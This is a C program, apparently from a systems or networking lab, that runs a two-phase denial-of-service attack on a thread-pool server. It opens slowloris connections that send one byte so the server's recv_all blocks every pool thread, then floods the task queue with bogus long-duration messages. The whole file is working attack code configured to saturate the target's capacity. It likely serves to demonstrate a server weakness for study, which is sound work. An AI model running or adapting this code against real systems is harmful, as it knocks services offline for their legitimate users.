#include <pthread.h>
#include <unistd.h>
#include "common.h"

// --- ATTACK CONFIG ---
// The server has a thread pool of 50 + a connection queue of 50 = 100 total capacity.
// We need just over 100 slowloris connections to completely block the server.
#define SLOWLORIS_THREADS 10    // Threads that hold connections open
#define CONNS_PER_THREAD  15    // Connections per thread (10 * 15 = 150 > 100)
#define FLOOD_THREADS     5     // Threads that spam valid messages (fill the task queue)
#define FLOOD_COUNT       200   // Messages each flood thread sends
#define HOLD_SECONDS      60    // How long to hold connections (attack window)

// Global target
struct sockaddr *target_addr;
socklen_t target_addr_len;

int total_established = 0;
pthread_mutex_t counter_lock = PTHREAD_MUTEX_INITIALIZER;

void resolve_target() {
    struct addrinfo hints = {0}, *res;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int err = getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &res);
    if (err != 0) {
        fprintf(stderr, "Target resolution failed: %s\n", gai_strerror(err));
        exit(1);
    }

    target_addr = malloc(res->ai_addrlen);
    memcpy(target_addr, res->ai_addr, res->ai_addrlen);
    target_addr_len = res->ai_addrlen;
    freeaddrinfo(res);
}

// --- PHASE 1: SLOWLORIS ---
// Connect and send partial data (1 byte). The server's recv_all() blocks
// waiting for sizeof(Message) = 76 bytes that never arrive.
// Each connection ties up one pool thread forever.
// Once all pool threads + the connection queue are full, the server is dead.
void* slowloris_thread(void* arg) {
    int tid = *(int*)arg;
    int sockets[CONNS_PER_THREAD];
    int open_count = 0;

    for (int i = 0; i < CONNS_PER_THREAD; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        if (connect(sock, target_addr, target_addr_len) < 0) {
            close(sock);
            continue;
        }

        // Send just 1 byte — recv_all expects 76 bytes.
        // The pool thread handling this connection blocks forever.
        char partial = 0x01;
        send(sock, &partial, 1, 0);

        sockets[open_count++] = sock;
    }

    pthread_mutex_lock(&counter_lock);
    total_established += open_count;
    int total = total_established;
    pthread_mutex_unlock(&counter_lock);

    printf("[Slowloris-%d] Holding %d connections | Total held: %d\n",
           tid, open_count, total);

    // Keep connections alive — server stays blocked for this duration
    sleep(HOLD_SECONDS);

    for (int i = 0; i < open_count; i++) {
        close(sockets[i]);
    }
    return NULL;
}

// --- PHASE 2: QUEUE FLOOD ---
// Send valid messages to fill the task queue with junk (duration=9999).
// If any pool threads are still free, this poisons the queue so workers
// get bogus tasks instead of real client tasks.
void* flood_thread(void* arg) {
    int tid = *(int*)arg;
    int sent = 0;

    for (int i = 0; i < FLOOD_COUNT; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        if (connect(sock, target_addr, target_addr_len) < 0) {
            close(sock);
            continue;
        }

        Message msg;
        msg.type = MSG_TASK_SUBMIT;
        msg.id = 99999;
        msg.duration = 9999; // Bogus long duration to waste worker time

        strncpy(msg.description, "DOS FLOOD", DESC_SIZE - 1);
        msg.description[DESC_SIZE - 1] = '\0';

        send(sock, &msg, sizeof(msg), 0);
        close(sock);
        sent++;
    }

    printf("[Flood-%d] Sent %d junk tasks.\n", tid, sent);
    return NULL;
}

int main() {
    int target_conns = SLOWLORIS_THREADS * CONNS_PER_THREAD;
    printf("=== DOS ATTACK on %s:%s ===\n", SERVER_IP, SERVER_PORT);
    printf("Phase 1 (Slowloris): %d threads x %d conns = %d stuck server threads\n",
           SLOWLORIS_THREADS, CONNS_PER_THREAD, target_conns);
    printf("Phase 2 (Flood):     %d threads x %d msgs  = %d junk tasks\n",
           FLOOD_THREADS, FLOOD_COUNT, FLOOD_THREADS * FLOOD_COUNT);
    printf("Hold time: %ds — try ./client during this window!\n\n", HOLD_SECONDS);

    resolve_target();

    int total = SLOWLORIS_THREADS + FLOOD_THREADS;
    pthread_t threads[SLOWLORIS_THREADS + FLOOD_THREADS];
    int tids[SLOWLORIS_THREADS + FLOOD_THREADS];

    // Phase 1: Launch slowloris (grab all pool threads)
    printf("[Phase 1] Launching slowloris...\n");
    for (int i = 0; i < SLOWLORIS_THREADS; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, slowloris_thread, &tids[i]);
    }

    // Wait for slowloris to saturate the thread pool
    sleep(3);
    printf("\n>>> Server pool is saturated (%d connections held).\n", total_established);
    printf(">>> Try running ./client now — it should hang or fail!\n\n");

    // Phase 2: Flood the task queue with junk
    printf("[Phase 2] Launching queue flood...\n");
    for (int i = 0; i < FLOOD_THREADS; i++) {
        int idx = SLOWLORIS_THREADS + i;
        tids[idx] = i;
        pthread_create(&threads[idx], NULL, flood_thread, &tids[idx]);
    }

    for (int i = 0; i < total; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n>>> Attack sequence finished.\n");
    return 0;
}
